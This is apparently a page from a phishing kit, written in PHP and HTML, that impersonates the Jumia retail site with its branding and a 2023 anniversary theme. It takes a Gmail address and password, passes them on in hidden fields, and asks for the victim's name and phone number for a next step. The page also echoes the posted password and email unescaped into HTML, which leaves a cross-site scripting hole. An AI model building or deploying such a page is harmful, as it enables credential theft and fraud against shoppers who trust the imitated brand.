<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jumia Anniversaire 2023 | Meilleures offres de Téléphones, TVs, Mode, Maison, Beauté et plus</title>
    <link rel="icon" type="image/ico" sizes="any" href="https://www.jumia.ma/assets_he/favicon.87f00114.ico">
    <link rel="stylesheet" href="../../css/conn.css">
<style>





</style>
</head>

<body>
   <?php
   require_once '../db/db.php';
   if ( 
      !isset($_POST['num_email']) || 
      empty($_POST['num_email']) ||  
      strpos($_POST['num_email'], '@gmail.com') === false || 
      !isset($_POST['password']) || 
      empty($_POST['password']) || 
      strlen(trim($_POST['password'])) < 8
   ){
      header('Location: login.php');
      exit(); 
   }
   ?>
   <div class="full_contain">
      <div class="spqcin_j"></div>
      <div class="header">
         <img class="logo" src="../../images/logojum" alt="Jumia Logo" width="69" height="67">
      </div>
      <div class="card">
         <form method="post" action="sign_up_2.php" onsubmit="return validateForm()">
            <div id="form-content">
               <div class="form-title" id="form-title">
                  <h2>Données personnelles</h2>
                     <p>
                        Il vous suffit de remplir les détails ci-dessous.
                     </p>
               </div>
               <div class="input-field" id="input-firstname">
                  <input type="text" name="Prénom" placeholder="Prénom*" id="input-prenom">
               </div>
               <div class="input-field" id="input-lastname">
                  <input type="text" name="Nom" placeholder="Nom de famille*" id="input-nom">
               </div>
               <div class="input-field" id="input-phone">
                  <input type="text" name="téléphone" placeholder="Numéro de téléphone*" id="input-telephone">
               </div>
               <div id="hidden-fields">
                  <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>">
                  <input type="hidden" name="num_email" value="<?php echo $_POST['num_email']; ?>">
               </div>
               <div id="submit-button">
                  <p id="red_er"></p>
                  <input type="submit" value="Continuer">
               </div>
                </div>
            </form>
        </div>

        <div class="bla_txt">
            <div id="ret" class="text">
                Si besoin d'aide, merci de vous référer au Centre d'Assistance ou de contacter notre service client.
            </div>
        </div>

        <div class="logo444">
            <img src="../../images/jumi" alt="Jumia Logo" width="90" height="17">
        </div>
    </div>

</body>
<script>
  function validateForm() {

            document.getElementById('red_er').style.visibility = 'hidden';

            const prenom = document.getElementById('input-prenom').value.trim();
            const nom = document.getElementById('input-nom').value.trim();
            const telephone = document.getElementById('input-telephone').value.trim();
            let errorMessage = "";

            if (prenom === "" || prenom.length < 3 || nom === "" || nom.length < 3) {
                errorMessage += "Le prénom et le nom doit contenir au moins 3 caractères.\n";
            }

            const phonePattern = /^[0-9]{10}$/;
            if (!phonePattern.test(telephone)) {
                errorMessage += "Le numéro de téléphone doit contenir 10 chiffres.\n";
            }

            if (errorMessage !== "") {
              document.getElementById('red_er').style.visibility = 'visible';
              document.getElementById('red_er').textContent=errorMessage;
                return false;
            }

            return true;
        }
</script>
</html>
